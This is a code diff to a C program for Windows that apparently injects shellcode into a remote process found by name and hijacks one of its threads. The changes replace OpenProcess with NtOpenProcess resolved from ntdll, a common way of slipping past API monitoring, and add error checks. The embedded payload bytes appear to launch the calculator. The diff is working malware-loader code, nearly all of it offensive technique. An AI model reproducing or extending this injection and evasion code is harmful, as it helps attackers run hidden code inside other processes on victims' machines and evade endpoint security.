@@ -38,6 +38,18 @@ unsigned char shellcode[] = {
     0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
 };
 
+// Manual definition of InitializeObjectAttributes needed for NtOpenProcess
+VOID InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a, HANDLE r, PSECURITY_DESCRIPTOR s) {
+	if (p) {
+		p->Length = sizeof(OBJECT_ATTRIBUTES);
+		p->RootDirectory = r;
+		p->Attributes = a;
+		p->ObjectName = n;
+		p->SecurityDescriptor = s;
+		p->SecurityQualityOfService = NULL;
+	}
+}
+
 int wmain() {
 	ULONG							uReturnLen1 = NULL,
 									uReturnLen2 = NULL;
@@ -47,8 +59,6 @@ int wmain() {
 	DWORD							dwThreadId = NULL;
 	HANDLE							hProcess = NULL;
 	HANDLE							hThread = NULL;
-
-
 
 	PVOID	pShellcodeAddress = NULL;
 	SIZE_T	sSizeOfShellcode = sizeof(shellcode);
@@ -61,10 +71,14 @@ int wmain() {
 
 	// Get syscall address
 	fnNtQuerySystemInformation	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+	fnNtOpenProcess				pNtOpenProcess = (fnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
 	fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
 	fnNtProtectVirtualMemory	pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
 	fnNtWriteVirtualMemory		pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
 	fnNtWaitForSingleObject		pNtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+
+	if (pNtQuerySystemInformation == NULL || pNtOpenProcess == NULL || pNtAllocateVirtualMemory == NULL || pNtProtectVirtualMemory == NULL || pNtWriteVirtualMemory == NULL || pNtWaitForSingleObject == NULL)
+		return FALSE;
 
 
 	//--------------------------------------------------------------------------------
@@ -91,14 +105,25 @@ int wmain() {
 		return FALSE;
 	}
 
+	// Initialize OBJECT_ATTRIBUTES and CLIENT_ID
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
+	CLIENT_ID ClientId;
+
     // Enumerating SystemProcInfo, looking for process "szProcName"
     while (TRUE) {
         if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcessName) == 0) {
             printf("Found process\n");
 			dwProcessId = (DWORD)SystemProcInfo->UniqueProcessId;
 			dwThreadId = (DWORD)SystemProcInfo->Threads[0].ClientId.UniqueThread;
-            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
-            if (hProcess == NULL)
+			ClientId.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
+			ClientId.UniqueThread = dwThreadId;
+			STATUS = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
+			if (STATUS != 0x0) {
+				printf("[!] NtOpenProcess Failed With Error : 0x%0.8X \n", STATUS);
+				return FALSE;
+			}
+			if (hProcess == NULL)
                 printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
             hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
             if (hThread == NULL)
@@ -114,7 +139,6 @@ int wmain() {
         SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
     }
 	printf("[+] Target Process \"%ws\" Detected With PID [ %d ] & TID [ %d ] & Handle [ %p ] \n", szProcessName, dwProcessId, dwThreadId, hThread);
-
 
 
     //--------------------------------------------------------------------------------
@@ -137,7 +161,7 @@ int wmain() {
 
 
 	//--------------------------------------------------------------------------------
-	// Inject shellcode to remote process
+	// Hijack remote thread
 	//--------------------------------------------------------------------------------
 
 	CONTEXT	ThreadCtx = { .ContextFlags = CONTEXT_ALL };
